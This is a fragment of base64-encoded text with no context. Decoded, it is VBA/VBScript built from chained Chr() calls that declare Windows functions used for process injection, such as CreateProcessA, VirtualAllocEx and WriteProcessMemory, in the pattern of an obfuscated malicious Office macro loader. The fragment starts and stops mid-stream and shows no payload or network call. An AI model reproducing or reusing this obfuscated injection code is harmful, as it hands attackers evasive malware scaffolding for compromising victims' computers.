E0KSYgXw0KQ2hyKDEyMSkmQ2hyKDM0KSZDaHIoMzIpJkNocig0MCkmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoMTA0KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDQpJkNocigzMikmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmIF8NCkNocigxMDgpJkNocigzMikmQ2hyKDEwOCkmQ2hyKDY4KSZDaHIoMTAxKSZDaHIoMTE1KSZDaHIoMTE2KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig4MCkmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDgyKSZDaHIoMTAxKSZDaHIoMTAyKSZDaHIoMzIpJkNocig4MykmQ2hyKDExMSkmQ2hyKDExNykmQ2hyKDExNCkmQ2hyKDk5KSZDaHIoMTAxKSYgXw0KQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDY1KSZDaHIoMTEwKSZDaHIoMTIxKSZDaHIoNDQpJkNocigzMikmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMDEpJkNocigxMTApJkNocigxMDMpJkNocigxMTYpJkNocigxMDQpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmIF8NCkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocig3NikmQ2hyKDEwMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDExNikmQ2hyKDEwNCkmQ2hyKDg3KSZDaHIoMTE0KSZDaHIoMTExKSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig4MCkmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDQxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSYgXw0KQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoODApJkNocigxMTYpJkNocigxMTQpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoODApJkNocigxMTQpJkNocigxMDUpJkNocigxMTgpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjgpJkNocigxMDEpJkNocig5OSkmQ2hyKDEwOCkmQ2hyKDk3KSZDaHIoMTE0KSZDaHIoMTAxKSZDaHIoMzIpJkNocig4MCkmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDgzKSYgXw0KQ2hyKDk3KSZDaHIoMTAyKSZDaHIoMTAxKSZDaHIoMzIpJkNocig3MCkmQ2hyKDExNykmQ2hyKDExMCkmQ2hyKDk5KSZDaHIoMTE2KSZDaHIoMTA1KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMzIpJkNocig4MikmQ2hyKDExNykmQ2hyKDExMCkmQ2hyKDgzKSZDaHIoMTE2KSZDaHIoMTE3KSZDaHIoMTAyKSZDaHIoMTAyKSZDaHIoMzIpJkNocig3NikmQ2hyKDEwNSkmQ2hyKDk4KSZDaHIoMzIpJkNocigzNCkmQ2hyKDEwNykmQ2hyKDEwMSkmQ2hyKDExNCkmQ2hyKDExMCkmQ2hyKDEwMSkmIF8NCkNocigxMDgpJkNocig1MSkmQ2hyKDUwKSZDaHIoMzQpJkNocigzMikmQ2hyKDY1KSZDaHIoMTA4KSZDaHIoMTA1KSZDaHIoOTcpJkNocigxMTUpJkNocigzMikmQ2hyKDM0KSZDaHIoNjcpJkNocigxMTQpJkNocigxMDEpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDgwKSZDaHIoMTE0KSZDaHIoMTExKSZDaHIoOTkpJkNocigxMDEpJkNocigxMTUpJkNocigxMTUpJkNocig2NSkmQ2hyKDM0KSZDaHIoMzIpJkNocig0MCkmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJiBfDQpDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDEwOCkmQ2hyKDExMikmQ2hyKDY1KSZDaHIoMTEyKSZDaHIoMTEyKSZDaHIoMTA4KSZDaHIoMTA1KSZDaHIoOTkpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwNSkmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDc4KSZDaHIoOTcpJkNocigxMDkpJkNocigxMDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJiBfDQpDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig2NykmQ2hyKDExMSkmQ2hyKDEwOSkmQ2hyKDEwOSkmQ2hyKDk3KSZDaHIoMTEwKSZDaHIoMTAwKSZDaHIoNzYpJkNocigxMDUpJkNocigxMTApJkNocigxMDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocigxMDgpJiBfDQpDaHIoMTEyKSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDY1KSZDaHIoMTE2KSZDaHIoMTE2KSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoOTgpJkNocigxMTcpJkNocigxMTYpJkNocigxMDEpJkNocigxMTUpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExMCkmQ2hyKDEyMSkmQ2hyKDQ0KSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig4NCkmQ2hyKDEwNCkmQ2hyKDExNCkmIF8NCkNocigxMDEpJkNocig5NykmQ2hyKDEwMCkmQ2hyKDY1KSZDaHIoMTE2KSZDaHIoMTE2KSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoOTgpJkNocigxMTcpJkNocigxMTYpJkNocigxMDEpJkNocigxMTUpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExMCkmQ2hyKDEyMSkmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDk4KSZDaHIoNzMpJkNocigxMTApJkNocigxMDQpJiBfDQpDaHIoMTAxKSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoMTE2KSZDaHIoNzIpJkNocig5NykmQ2hyKDExMCkmQ2hyKDEwMCkmQ2hyKDEwOCkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDQpJkNocigzMikmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoMTAwKSZDaHIoMTE5KSZDaHIoNjcpJkNocigxMTQpJkNocigxMDEpJiBfDQpDaHIoOTcpJkNocigxMTYpJkNocigxMDUpJkNocigxMTEpJkNocigxMTApJkNocig3MCkmQ2hyKDEwOCkmQ2hyKDk3KSZDaHIoMTAzKSZDaHIoMTE1KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoNjkpJkNocigxMTApJkNocigxMTgpJkNocigxMDUpJkNocigxMTQpJkNocigxMTEpJkNocigxMTApJkNocigxMDkpJkNocigxMDEpJkNocigxMTApJiBfDQpDaHIoMTE2KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTApJkNocigxMjEpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig2NykmQ2hyKDExNykmQ2hyKDExNCkmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDExMCkmQ2hyKDExNikmQ2hyKDY4KSZDaHIoMTA1KSZDaHIoMTE0KSZDaHIoMTAxKSZDaHIoOTkpJkNocigxMTYpJkNocigxMTEpJiBfDQpDaHIoMTE0KSZDaHIoMTIxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoODMpJkNocigxMTYpJkNocigxMTQpJkNocigxMDUpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoODMpJkNocigxMTYpJkNocig5NykmQ2hyKDExNCkmQ2hyKDExNikmQ2hyKDExNykmQ2hyKDExMikmQ2hyKDczKSZDaHIoMTEwKSZDaHIoMTAyKSZDaHIoMTExKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoODMpJiBfDQpDaHIoODQpJkNocig2NSkmQ2hyKDgyKSZDaHIoODQpJkNocig4NSkmQ2hyKDgwKSZDaHIoNzMpJkNocig3OCkmQ2hyKDcwKSZDaHIoNzkpJkNocig0NCkmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDczKSZDaHIoMTEwKSZDaHIoMTAyKSZDaHIoMTExKSZDaHIoMTE0KSZDaHIoMTA5KSZDaHIoOTcpJkNocigxMTYpJkNocigxMDUpJkNocigxMTEpJkNocigxMTApJiBfDQpDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoODApJkNocig4MikmQ2hyKDc5KSZDaHIoNjcpJkNocig2OSkmQ2hyKDgzKSZDaHIoODMpJkNocig5NSkmQ2hyKDczKSZDaHIoNzgpJkNocig3MCkmQ2hyKDc5KSZDaHIoODIpJkNocig3NykmQ2hyKDY1KSZDaHIoODQpJkNocig3MykmQ2hyKDc5KSZDaHIoNzgpJkNocig0MSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSYgXw0KQ2hyKDEwKSZDaHIoMzUpJkNocig2OSkmQ2hyKDEwOCkmQ2hyKDExNSkmQ2hyKDEwMSkmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoMzIpJkNocig4MCkmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDExOCkmQ2hyKDk3KSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoMzIpJkNocig2OCkmQ2hyKDEwMSkmQ2hyKDk5KSZDaHIoMTA4KSZDaHIoOTcpJkNocigxMTQpJkNocigxMDEpJkNocigzMikmQ2hyKDcwKSZDaHIoMTE3KSZDaHIoMTEwKSZDaHIoOTkpJkNocigxMTYpJiBfDQpDaHIoMTA1KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMzIpJkNocig2NykmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDk3KSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoODMpJkNocigxMTYpJkNocigxMTcpJkNocigxMDIpJkNocigxMDIpJkNocigzMikmQ2hyKDc2KSZDaHIoMTA1KSZDaHIoOTgpJkNocigzMikmQ2hyKDM0KSZDaHIoMTA3KSZDaHIoMTAxKSZDaHIoMTE0KSZDaHIoMTEwKSZDaHIoMTAxKSZDaHIoMTA4KSZDaHIoNTEpJkNocig1MCkmQ2hyKDM0KSZDaHIoMzIpJkNocig2NSkmIF8NCkNocigxMDgpJkNocigxMDUpJkNocig5NykmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoMzQpJkNocig2NykmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDk3KSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoODIpJkNocigxMDEpJkNocigxMDkpJkNocigxMTEpJkNocigxMTYpJkNocigxMDEpJkNocig4NCkmQ2hyKDEwNCkmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDk3KSZDaHIoMTAwKSZDaHIoMzQpJkNocigzMikmQ2hyKDQwKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSYgXw0KQ2hyKDMyKSZDaHIoMTA0KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDQpJkNocigzMikmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoMTA4KSZDaHIoMTEyKSZDaHIoODQpJkNocigxMDQpJkNocigxMTQpJkNocigxMDEpJkNocig5NykmIF8NCkNocigxMDApJkNocig2NSkmQ2hyKDExNikmQ2hyKDExNikmQ2hyKDExNCkmQ2hyKDEwNSkmQ2hyKDk4KSZDaHIoMTE3KSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoMTE1KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDApJkNocigxMTkpJkNocig4MykmQ2hyKDExNikmQ2hyKDk3KSYgXw0KQ2hyKDk5KSZDaHIoMTA3KSZDaHIoODMpJkNocigxMDUpJkNocigxMjIpJkNocigxMDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDEwOCkmQ2hyKDExMikmQ2hyKDgzKSZDaHIoMTE2KSZDaHIoOTcpJkNocigxMTQpJkNocigxMTYpJkNocig2NSkmQ2hyKDEwMCkmQ2hyKDEwMCkmIF8NCkNocigxMTQpJkNocigxMDEpJkNocigxMTUpJkNocigxMTUpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig4MCkmQ2hyKDk3KSZDaHIoMTE0KSZDaHIoOTcpJkNocigxMDkpJkNocigxMDEpJkNocigxMTYpJkNocigxMDEpJkNocigxMTQpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmIF8NCkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDApJkNocigxMTkpJkNocig2NykmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDk3KSZDaHIoMTE2KSZDaHIoMTA1KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoNzApJkNocigxMDgpJkNocig5NykmQ2hyKDEwMykmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSYgXw0KQ2hyKDQ0KSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig4NCkmQ2hyKDEwNCkmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDk3KSZDaHIoMTAwKSZDaHIoNzMpJkNocig2OCkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDEwKSZDaHIoMzIpJkNocigzMikmIF8NCkNocigzMikmQ2hyKDMyKSZDaHIoODApJkNocigxMTQpJkNocigxMDUpJkNocigxMTgpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjgpJkNocigxMDEpJkNocig5OSkmQ2hyKDEwOCkmQ2hyKDk3KSZDaHIoMTE0KSZDaHIoMTAxKSZDaHIoMzIpJkNocig3MCkmQ2hyKDExNykmQ2hyKDExMCkmQ2hyKDk5KSZDaHIoMTE2KSZDaHIoMTA1KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMzIpJkNocig2NSkmQ2hyKDEwOCkmQ2hyKDEwOCkmQ2hyKDExMSkmQ2hyKDk5KSYgXw0KQ2hyKDgzKSZDaHIoMTE2KSZDaHIoMTE3KSZDaHIoMTAyKSZDaHIoMTAyKSZDaHIoMzIpJkNocig3NikmQ2hyKDEwNSkmQ2hyKDk4KSZDaHIoMzIpJkNocigzNCkmQ2hyKDEwNykmQ2hyKDEwMSkmQ2hyKDExNCkmQ2hyKDExMCkmQ2hyKDEwMSkmQ2hyKDEwOCkmQ2hyKDUxKSZDaHIoNTApJkNocigzNCkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMDgpJkNocigxMDUpJkNocig5NykmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoMzQpJkNocig4NikmQ2hyKDEwNSkmQ2hyKDExNCkmQ2hyKDExNikmIF8NCkNocigxMTcpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDY1KSZDaHIoMTA4KSZDaHIoMTA4KSZDaHIoMTExKSZDaHIoOTkpJkNocig2OSkmQ2hyKDEyMCkmQ2hyKDM0KSZDaHIoMzIpJkNocig0MCkmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoMTA0KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSYgXw0KQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDEwOCkmQ2hyKDExMikmQ2hyKDY1KSZDaHIoMTAwKSZDaHIoMTAwKSZDaHIoMTE0KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSYgXw0KQ2hyKDMyKSZDaHIoMTA4KSZDaHIoODMpJkNocigxMDUpJkNocigxMjIpJkNocigxMDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDEwMikmQ2hyKDEwOCkmQ2hyKDY1KSZDaHIoMTA4KSZDaHIoMTA4KSZDaHIoMTExKSZDaHIoOTkpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwNSkmIF8NCkNocigxMTEpJkNocigxMTApJkNocig4NCkmQ2hyKDEyMSkmQ2hyKDExMikmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDQpJkNocigzMikmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoMTAyKSZDaHIoMTA4KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocigxMTYpJkNocigxMDEpJkNocig5OSkmQ2hyKDExNikmQ2hyKDMyKSYgXw0KQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDQxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocigxMCkmQ2hyKDMyKSZDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoODApJkNocigxMTQpJkNocigxMDUpJkNocigxMTgpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjgpJkNocigxMDEpJkNocig5OSkmIF8NCkNocigxMDgpJkNocig5NykmQ2hyKDExNCkmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNzApJkNocigxMTcpJkNocigxMTApJkNocig5OSkmQ2hyKDExNikmQ2hyKDEwNSkmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDMyKSZDaHIoODcpJkNocigxMTQpJkNocigxMDUpJkNocigxMTYpJkNocigxMDEpJkNocig4MykmQ2hyKDExNikmQ2hyKDExNykmQ2hyKDEwMikmQ2hyKDEwMikmQ2hyKDMyKSZDaHIoNzYpJkNocigxMDUpJkNocig5OCkmQ2hyKDMyKSZDaHIoMzQpJkNocigxMDcpJkNocigxMDEpJiBfDQpDaHIoMTE0KSZDaHIoMTEwKSZDaHIoMTAxKSZDaHIoMTA4KSZDaHIoNTEpJkNocig1MCkmQ2hyKDM0KSZDaHIoMzIpJkNocig2NSkmQ2hyKDEwOCkmQ2hyKDEwNSkmQ2hyKDk3KSZDaHIoMTE1KSZDaHIoMzIpJkNocigzNCkmQ2hyKDg3KSZDaHIoMTE0KSZDaHIoMTA1KSZDaHIoMTE2KSZDaHIoMTAxKSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDc3KSZDaHIoMTAxKSZDaHIoMTA5KSZDaHIoMTExKSZDaHIoMTE0KSYgXw0KQ2hyKDEyMSkmQ2hyKDM0KSZDaHIoMzIpJkNocig0MCkmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoMTA0KSZDaHIoODApJkNocigxMTQpJkNocigxMTEpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDExNSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDQpJkNocigzMikmQ2hyKDY2KSZDaHIoMTIxKSZDaHIoODYpJkNocig5NykmIF8NCkNocigxMDgpJkNocigzMikmQ2hyKDEwOCkmQ2hyKDY4KSZDaHIoMTAxKSZDaHIoMTE1KSZDaHIoMTE2KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4MikmQ2hyKDEwMSkmQ2hyKDEwMikmQ2hyKDMyKSZDaHIoODMpJkNocigxMTEpJkNocigxMTcpJkNocigxMTQpJkNocig5OSkmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJiBfDQpDaHIoMzIpJkNocig2NSkmQ2hyKDExMCkmQ2hyKDEyMSkmQ2hyKDQ0KSZDaHIoMzIpJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDc2KSZDaHIoMTAxKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoMTE2KSZDaHIoMTA0KSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMTEpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSYgXw0KQ2hyKDEwOCkmQ2hyKDMyKSZDaHIoNzYpJkNocigxMDEpJkNocigxMTApJkNocigxMDMpJkNocigxMTYpJkNocigxMDQpJkNocig4NykmQ2hyKDExNCkmQ2hyKDExMSkmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjUpJkNocigxMTUpJkNocigzMikmQ2hyKDc2KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMTAzKSZDaHIoNDEpJkNocigzMikmQ2hyKDY1KSZDaHIoMTE1KSZDaHIoMzIpJkNocig3NikmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDEwMykmQ2hyKDEwKSZDaHIoMzIpJiBfDQpDaHIoMzIpJkNocigzMikmQ2hyKDMyKSZDaHIoODApJkNocigxMTQpJkNocigxMDUpJkNocigxMTgpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwMSkmQ2hyKDMyKSZDaHIoNjgpJkNocigxMDEpJkNocig5OSkmQ2hyKDEwOCkmQ2hyKDk3KSZDaHIoMTE0KSZDaHIoMTAxKSZDaHIoMzIpJkNocig3MCkmQ2hyKDExNykmQ2hyKDExMCkmQ2hyKDk5KSZDaHIoMTE2KSZDaHIoMTA1KSZDaHIoMTExKSZDaHIoMTEwKSZDaHIoMzIpJkNocig4MikmQ2hyKDExNykmQ2hyKDExMCkmQ2hyKDgzKSYgXw0KQ2hyKDExNikmQ2hyKDExNykmQ2hyKDEwMikmQ2hyKDEwMikmQ2hyKDMyKSZDaHIoNzYpJkNocigxMDUpJkNocig5OCkmQ2hyKDMyKSZDaHIoMzQpJkNocigxMDcpJkNocigxMDEpJkNocigxMTQpJkNocigxMTApJkNocigxMDEpJkNocigxMDgpJkNocig1MSkmQ2hyKDUwKSZDaHIoMzQpJkNocigzMikmQ2hyKDY1KSZDaHIoMTA4KSZDaHIoMTA1KSZDaHIoOTcpJkNocigxMTUpJkNocigzMikmQ2hyKDM0KSZDaHIoNjcpJkNocigxMTQpJkNocigxMDEpJkNocig5NykmQ2hyKDExNikmIF8NCkNocigxMDEpJkNocig4MCkmQ2hyKDExNCkmQ2hyKDExMSkmQ2hyKDk5KSZDaHIoMTAxKSZDaHIoMTE1KSZDaHIoMTE1KSZDaHIoNjUpJkNocigzNCkmQ2hyKDMyKSZDaHIoNDApJkNocig2NikmQ2hyKDEyMSkmQ2hyKDg2KSZDaHIoOTcpJkNocigxMDgpJkNocigzMikmQ2hyKDEwOCkmQ2hyKDExMikmQ2hyKDY1KSZDaHIoMTEyKSZDaHIoMTEyKSZDaHIoMTA4KSZDaHIoMTA1KSZDaHIoOTkpJkNocig5NykmQ2hyKDExNikmQ2hyKDEwNSkmQ2hyKDExMSkmQ2hyKDExMCkmQ2hyKDc4KSYgXw0KQ2hyKDk3KSZDaHIoMTA5KSZDaHIoMTAxKSZDaHIoMzIpJkNocig2NSkmQ2hyKDExNSkmQ2hyKDMyKSZDaHIoODMpJkNocigxMTYpJkNocigxMTQpJkNocigxMDUpJkNocigxMTApJkNocigxMDMpJkNocig0NCkmQ2hyKDMyKSZDaHIoNjYpJkNocigxMjEpJkNocig4NikmQ2hyKDk3KSZDaHIoMTA4KSZDaHIoMzIpJkNocigxMDgpJkNocigxMTIpJkNocig2NykmQ2hyKDExMSkmQ2hyKDEwOSkmQ2hyKDEwOSkmQ2hyKDk3KSZDaHIoMTEwKSZDaHIoMTAwK